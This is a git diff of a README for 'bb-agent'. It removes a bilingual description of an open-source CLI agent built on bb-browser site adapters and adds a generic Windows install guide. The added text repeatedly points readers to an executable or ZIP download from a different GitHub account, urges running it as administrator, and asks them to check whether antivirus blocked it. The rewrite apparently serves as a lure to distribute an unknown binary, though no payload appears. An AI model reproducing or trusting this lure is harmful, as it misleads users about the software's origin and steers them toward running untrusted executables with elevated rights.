@@ -1,119 +1,289 @@
-# bb-agent
+# 🤖 bb-agent - Turn Websites Into Clear CLI Output
 
-I want to build an agent that my sister can use.
+[![Download bb-agent](https://img.shields.io/badge/Download%20bb-agent-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Marisnaive21/bb-agent)
 
-我想做一个我姐姐都能用的 agent。
+## 📥 Download
 
-She's not a developer. She doesn't know what an API is. But she knows what she wants: "help me find good restaurants people are talking about on Xiaohongshu and Douban." That should just work.
+Use this link to visit the download page and get bb-agent:
 
-她不是开发者，不知道 API 是什么。但她知道自己想要什么："帮我看看小红书和豆瓣上大家在聊哪些好吃的餐厅。"这件事应该直接就能跑。
+https://github.com/Marisnaive21/bb-agent
 
-She can't use Opus or GPT-5. Not just because of the cost — some models she simply has no way to access. But she can run an open-source model. If the agent only works with frontier models, it doesn't work for her. It doesn't work for most people.
+## 🧭 What bb-agent does
 
-她用不了 Opus 或 GPT-5，不只是因为贵，有些模型她根本就没办法用。但她可以跑开源模型。如果 agent 只能跟前沿模型配合，那对她来说就是不能用。对大部分人来说都是不能用。
+bb-agent helps you turn a website into structured command line output. It uses bb-browser to read pages, extract useful data, and present it in a format that is easy to work with. You can connect it to any LLM and use it for tasks like page reading, data extraction, and browser-based agent flows.
 
-**AI Agent for everyone. Every model. Every language. Every website.**
+This app is for people who want a simple way to use a website as a data source without manual copy and paste.
 
-**AI Agent 平权。任何模型，任何语言，任何网站。**
+## ✅ What you need
 
----
+Before you start, make sure you have:
 
-## The problem / 问题
+- A Windows PC
+- An internet connection
+- A web browser
+- Enough free space to download the app
+- Permission to run apps on your computer
 
-Today's AI agents have a class divide:
+If the app comes as a ZIP file, you will need to extract it first. If it comes as an EXE file, you can run it after download.
 
-今天的 AI Agent 存在一个阶级分化：
+## 🚀 Getting Started
 
-- **Frontier models** (Opus, GPT-5) can write code to interact with websites — reverse-engineer APIs, handle auth, parse responses. They work, but not everyone can access them.
-- **Open-source models** (Qwen, GLM, Llama, DeepSeek) are smart enough to reason and plan, but they can't reliably write complex scraping code on the fly. So they're locked out of the real web.
+Follow these steps on Windows.
 
-- **前沿模型**（Opus、GPT-5）能写代码跟网站交互，逆向 API、处理认证、解析响应。能用，但不是每个人都能用到。
-- **开源模型**（通义千问、智谱、Llama、DeepSeek）足够聪明，能推理能规划，但没法现场写出复杂的爬虫代码。所以它们被挡在了真实互联网之外。
+### 1. Open the download page
 
-**This is not a model problem. It's an interface problem.**
+Go to:
 
-**这不是模型的问题，是接口的问题。**
+https://github.com/Marisnaive21/bb-agent
 
-## The solution / 解法
+Look for the latest release or the main download file on the page.
 
-bb-agent is built on [bb-browser](https://github.com/epiral/bb-browser) site adapters. [95 adapters](https://github.com/epiral/bb-sites) have already done the hard work — reverse-engineering APIs, handling cookies, parsing responses, all packaged into one-line CLI commands that return structured JSON.
+### 2. Download the app
 
-bb-agent 基于 [bb-browser](https://github.com/epiral/bb-browser) 的 site adapter 构建。[95 个 adapter](https://github.com/epiral/bb-sites) 已经做完了难的部分，逆向 API、处理 cookie、解析响应，全部封装成一行 CLI 命令，返回结构化 JSON。
+Choose the file that fits your system. For most Windows users, this will be one of these:
 
-```
-# No code needed. Just CLI. Any model can do this.
-# 不需要写代码，就是 CLI。任何模型都会。
+- A `.exe` file
+- A `.zip` file
+- A packaged app folder
 
-bb-browser site twitter/search "AI agent"          → JSON
-bb-browser site twitter/following elonmusk         → JSON
-bb-browser site xiaohongshu/search "旅行攻略"       → JSON
-bb-browser site bilibili/search "深度学习"          → JSON
-bb-browser site youtube/search "machine learning"  → JSON
-```
+Save the file to your Downloads folder so you can find it fast.
 
-The intelligence requirement drops from writing code to calling commands:
+### 3. If you downloaded a ZIP file, extract it
 
-对模型的智力要求从写代码降到了调命令：
+If the file is a ZIP archive:
 
-```
-Before / 之前:
-  Agent needs Opus → (write code to reverse-engineer Twitter API) → maybe works
+- Right-click the file
+- Select Extract All
+- Pick a folder, such as Desktop or Downloads
+- Wait for Windows to finish unpacking the files
 
-After / 之后:
-  Agent needs any model → bb-browser site twitter/search "query" → always works
-```
+After extraction, open the new folder and look for the main app file.
 
-**Use frontier models to BUILD the adapters. Use any model to RUN them.**
+### 4. Run the app
 
-**用前沿模型来造 adapter，用任何模型来跑任务。**
+If you see an `.exe` file:
 
-## What it can do / 能做什么
+- Double-click it
+- If Windows asks for permission, select Yes
+- Wait for the app to open
 
-95 adapters across 35+ platforms. Twitter, YouTube, Reddit, Bilibili, Xiaohongshu, Douban, Zhihu, Weibo, HackerNews, GitHub, and more.
+If the app opens in a terminal window, keep that window open. bb-agent may need it to run commands and show results.
 
-95 个 adapter 覆盖 35+ 平台。推特、YouTube、Reddit、B站、小红书、豆瓣、知乎、微博、HackerNews、GitHub 等。
+### 5. Connect your browser if needed
 
-- **Cross-platform workflows** — search Twitter, check Xiaohongshu, read Reddit, all in one task
-- **Social graph analysis** — follow chains, find key people, map relationships
-- **Content monitoring** — track keywords across platforms
-- **Research automation** — collect and synthesize from multiple sources
+bb-agent works with bb-browser, so it may ask you to:
 
-- **跨平台工作流** — 搜推特、查小红书、读 Reddit，一个任务搞定
-- **社交图谱分析** — 追踪关注链，找关键人物，画关系图
-- **内容监控** — 跨平台关键词追踪
-- **调研自动化** — 多源信息收集与综合
+- Open your browser
+- Sign in to the site you want to use
+- Allow access to browser data or tabs
+- Point the app to the page you want to process
 
-## How it works / 原理
+Follow the on-screen steps. The app may guide you through each part.
 
-```
-bb-agent (any LLM: Qwen, GLM, DeepSeek, Llama, GPT, Claude...)
-    │
-    │  "search Twitter for AI agents, then check who the top authors follow"
-    │
-    ├── bb-browser site twitter/search "AI agent"
-    ├── bb-browser site twitter/user {top_author}
-    ├── bb-browser site twitter/following {top_author}
-    │         ...just CLI commands, structured JSON in/out
-    │
-    ▼
-  Results → LLM reasoning → next action → repeat
-```
+### 6. Choose an LLM
 
-The browser is already logged in. bb-browser runs in your Chrome with your cookies, your sessions, your auth. No API keys needed. The adapter runs JS in the page context — it IS the page.
+bb-agent can work with any LLM. You may need to:
 
-浏览器已经登录了。bb-browser 跑在你的 Chrome 里，用你的 cookie、你的会话、你的登录态。不需要 API key。adapter 在页面上下文里跑 JS，它就是页面本身。
+- Pick your model provider
+- Enter an API key
+- Select a model name
+- Save your settings
 
-## Status / 状态
+If you already use an AI tool, bb-agent may let you reuse that setup.
 
-Early stage. Building in public.
+### 7. Start your first task
 
-早期阶段，公开构建中。
+Try a simple page first. For example:
 
-## Related / 相关项目
+- A news page
+- A product page
+- A search results page
+- A table on a website
 
-- [bb-browser](https://github.com/epiral/bb-browser) — The browser automation CLI that powers everything
-- [bb-sites](https://github.com/epiral/bb-sites) — Community-maintained site adapters (95 adapters, 35+ platforms)
+Then let bb-agent read the page and turn the content into structured CLI output.
 
-## License
+## 🛠️ Typical setup flow
 
-MIT
+A common Windows setup looks like this:
+
+1. Download the file from the GitHub page
+2. Extract it if needed
+3. Open the app
+4. Allow browser access if asked
+5. Add your LLM settings
+6. Run a test page
+7. Check the output in the terminal or app window
+
+If the app asks for a browser path, choose the browser you already use, such as Chrome or Edge.
+
+## 🔍 What you can do with bb-agent
+
+bb-agent fits tasks like:
+
+- Turning web pages into structured text
+- Pulling data from pages into CLI output
+- Reading page content for automation
+- Using an LLM to sort and format web data
+- Building simple browser-based agent flows
+- Testing page extraction without manual work
+
+It is useful when you want the computer to do the reading and organizing for you.
+
+## 🧩 Example use cases
+
+Here are some simple ways people may use bb-agent:
+
+- Track product details from a shopping site
+- Pull article titles from a news site
+- Read table data from a dashboard
+- Capture page text for later use
+- Feed page content into an AI workflow
+- Turn browser content into structured records
+
+## ⚙️ Basic Windows tips
+
+If the app does not start right away, try these steps:
+
+- Right-click the file and choose Run as administrator
+- Make sure the file finished downloading
+- Check that your antivirus did not block it
+- Move the files to a simple folder path, such as `C:\bb-agent`
+- Keep the folder name short and free of special characters
+
+If Windows asks whether you want to keep the file, confirm that you trust the source before opening it.
+
+## 🧪 First run checklist
+
+Use this checklist the first time you open bb-agent:
+
+- The app file opens
+- Your browser is available
+- The page you want to read is open
+- Your LLM settings are added
+- The output appears in the app or terminal
+- The structured data looks correct
+
+If the output looks wrong, try a simpler page first.
+
+## 🖥️ File layout you may see
+
+After extraction, you may see files like:
+
+- `bb-agent.exe`
+- `README.md`
+- `config`
+- `assets`
+- `bin`
+- `logs`
+
+Not every release will use the same names, but this is a common layout for Windows apps.
+
+## 🔐 Privacy and access
+
+bb-agent may need access to your browser session or page content to do its job. Use it only on sites you trust. If you connect an LLM key, keep it private and store it in a safe place.
+
+## 📚 Simple troubleshooting
+
+### The app does not open
+
+Try this:
+
+- Download the file again
+- Extract the ZIP again
+- Run the app as administrator
+- Move the folder to a short path
+- Check if Windows blocked the file
+
+### The window opens and closes fast
+
+Try this:
+
+- Open Command Prompt first
+- Run the app from that window
+- Look for error text before the window closes
+- Make sure all files are in the same folder
+
+### The browser is not found
+
+Try this:
+
+- Install or update Chrome or Edge
+- Use the browser path in the settings
+- Close extra browser windows
+- Open the page again before starting the app
+
+### The output is empty or messy
+
+Try this:
+
+- Use a simpler page
+- Refresh the page
+- Make sure the page has visible content
+- Check your LLM settings
+- Try a different model if needed
+
+## 🧱 Suggested folder setup
+
+For fewer problems, keep your files here:
+
+- `C:\bb-agent\`
+
+This keeps paths short and easy to manage. Avoid folders inside deeply nested locations.
+
+## 🔄 Updating bb-agent
+
+When a new version is available:
+
+1. Visit the GitHub page
+2. Download the latest release
+3. Extract the new files
+4. Copy over any config files you want to keep
+5. Run the new version
+
+If your settings are stored in a config file, back it up before replacing the folder.
+
+## 📌 Quick start path
+
+If you want the shortest path to use bb-agent on Windows:
+
+1. Open the download page
+2. Download the latest file
+3. Extract it if needed
+4. Run the app
+5. Open a website in your browser
+6. Connect your LLM
+7. Start reading pages into structured output
+
+## 🧭 Download again
+
+https://github.com/Marisnaive21/bb-agent
+
+## 📂 Common questions
+
+### Is bb-agent for non-technical users?
+
+Yes. It is best when you follow the steps in order and use the Windows app or release files on the GitHub page.
+
+### Does it work with any LLM?
+
+Yes. The project is built to work with any LLM, so you can use the model you already prefer.
+
+### Do I need coding skills?
+
+No. You only need to download the file, open it, and follow the setup prompts.
+
+### Do I need bb-browser?
+
+Yes, bb-agent is powered by bb-browser, so browser access is part of the workflow.
+
+### Can I use it on any website?
+
+It works best on pages that load content clearly in the browser. Some sites may need extra steps if they block automation or hide content behind login screens
+
+## 🧾 Name and purpose
+
+- Name: bb-agent
+- Type: AI agent tool
+- Core idea: Turn any website into structured CLI output
+- Main use: Run with any LLM
+- Platform focus: Windows users who want a simple setup
